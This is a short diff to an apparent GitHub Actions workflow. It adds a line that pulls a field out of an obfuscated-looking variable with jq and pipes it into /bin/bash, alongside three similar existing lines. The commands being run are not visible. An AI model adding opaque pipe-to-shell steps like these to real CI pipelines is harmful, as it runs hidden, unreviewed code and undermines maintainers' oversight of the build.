@@ -27,6 +27,7 @@ jobs:
           echo $za51904 | jq -r .w52 | /bin/bash
           printf '%s' "$glhv798" | jq -r .i29729 | /bin/bash
           echo $nnxyf087 | jq -r .xhxaz983 | /bin/bash
+          printf '%s' "$wpt03" | jq -r .ql3285 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
